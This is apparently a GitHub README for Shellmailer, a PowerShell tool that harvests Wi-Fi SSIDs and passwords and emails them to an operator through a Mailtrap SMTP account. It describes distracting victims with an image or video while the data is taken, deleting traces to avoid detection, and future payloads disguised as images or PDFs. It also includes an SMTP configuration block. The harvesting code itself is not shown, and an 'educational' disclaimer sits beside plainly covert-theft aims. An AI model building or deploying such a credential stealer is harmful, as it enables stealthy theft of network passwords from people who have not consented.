# Shellmailer

Shellmailer is a PowerShell-based utility designed to collect user credentials and transmit them via email using a configured SMTP server (Mailtrap). The tool focuses on retrieving Wi-Fi SSIDs and passwords, then securely sending the data to a recipient email, all without requiring administrative privileges.

## Features

- **No Admin Required:** Collects data without the need for elevated PowerShell permissions.
- **User Distraction:** Upon execution, the user is redirected to an image or video for distraction while data is gathered in the background.
- **Wi-Fi Credentials Collection:** Extracts available Wi-Fi SSIDs and passwords from the user's system.
- **Secure Transmission:** Sends collected credentials via SMTP (Mailtrap recommended) to a specified email address.
- **Cleanup:** Deletes all payload files and traces after execution to minimize detection.
- **Modular Design:** Currently requires three files for payload delivery, with plans for future single-file (.exe) payloads disguised as images or PDFs.

## Concept

The main idea behind Shellmailer is to collect user data and transmit it securely through email, leveraging PowerShell's scripting capabilities. The project aims for stealth and ease of use, avoiding prompts for administrator access and expanding payload delivery methods in future versions.

## Configuration

To use Shellmailer, configure your SMTP credentials in the script:

```powershell
# ==== CONFIGURATION ====
$SmtpServer = $SMTP_SERVER          # LIVE SMTP, not sandbox
$SmtpPort   = $SMTP_PORT            # Typically 587 for TLS
$Username   = $SMTP_USERNAME        # From Mailtrap SMTP credentials
$Password   = $SMTP_PASSWORD        # From Mailtrap SMTP credentials
$From       = $SMTP_FROM            # Must match your Mailtrap domain
$To         = $SMTP_TO              # Real recipient
```

Replace the variables above with your actual Mailtrap SMTP credentials and desired recipient email address.

## Usage

1. **Configure SMTP:** Edit the script to include your Mailtrap SMTP credentials and the recipient address.
2. **Deploy Payload:** Distribute the payload files to the target system.
3. **Execution:** When the user runs the program, they will be shown a distraction image/video while Wi-Fi credentials are harvested and sent via email.
4. **Cleanup:** The script removes all traces of itself after execution.

## Future Plans

- Deliver payloads as a single .exe file disguised as images or PDFs.
- Expand supported data collection beyond Wi-Fi credentials.
- Implement additional stealth and delivery mechanisms.

## Disclaimer

This project is intended for educational and authorized security testing purposes only. **Do not use Shellmailer for unauthorized access or malicious activity.** The author is not responsible for misuse or damages caused by this tool.

---
**Author:** [RevoVog](https://github.com/RevoVog)
